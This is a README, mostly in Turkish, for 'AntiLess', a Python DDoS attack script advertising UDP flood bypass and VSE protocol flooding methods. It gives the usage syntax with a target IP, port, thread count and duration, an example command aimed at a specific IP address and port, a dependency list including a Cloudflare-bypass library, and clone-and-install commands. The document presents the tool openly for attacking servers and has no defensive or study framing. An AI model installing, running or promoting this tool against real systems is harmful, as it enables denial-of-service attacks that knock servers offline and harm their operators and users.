
<em><h5 align="center">AntiLess - DDoS Saldırı Scripti > 9 Method</h5></em>
<em><h5 align="center">(Programlanma dili - Python 3)</h5></em>


<em><h5 align="center">(If it worked for you, don't forget to Fork and Star)</h5></em>
<em><h5 align="center">(Eğer işine yaradıysa Fork ve Star atmayı unutma)</h5></em>


## Özellikler ve methodlar

* Layer4: 
  * UDP | UDP Flood Bypass
  * VSE | Protokol gönderimi (DDraceNetwork ✅)

* ⚙️ Tools - Nasıl kullanılır
`
python3 anti.py tools
`
  * ☢️  PING | Serverların pinlglerini ölçer.
  * ✔️ CHECK | Sitelerin durumunu checkler.

**Nasıl kullanılır?**

```shell
python3 anti.py <method> <ip:port> <threads> <duration> <config.json (Güçlendirme)>
```

```shell
ÖRNEK ÇIKTI: python3 anti.py VSE 62.106.84.67:8332 2 1000 config.json 100 600
```
```shell
not: ip - port - method ve diğer değişkenleri kendinize göre değiştirin.
```

**Gerekliler**

* [dnspython](https://github.com/rthalley/dnspython)
* [cfscrape](https://github.com/Anorov/cloudflare-scrape)
* [impacket](https://github.com/SecureAuthCorp/impacket)
* [requests](https://github.com/psf/requests)
* [Python3][python3]
* [Antiless](https://github.com/antilagg/Antiless)
* [icmplib](https://github.com/ValentinBELYN/icmplib)
* [certifi](https://github.com/certifi/python-certifi)
* [psutil](https://github.com/giampaolo/psutil)
* [yarl](https://github.com/aio-libs/yarl)
---

```shell
git clone https://github.com/antilagg/Antiless-DDoS.git
cd Antiless-DDoS
pip install -r moduller.txt
```

[python3]: https://python.org 'Python3'

---
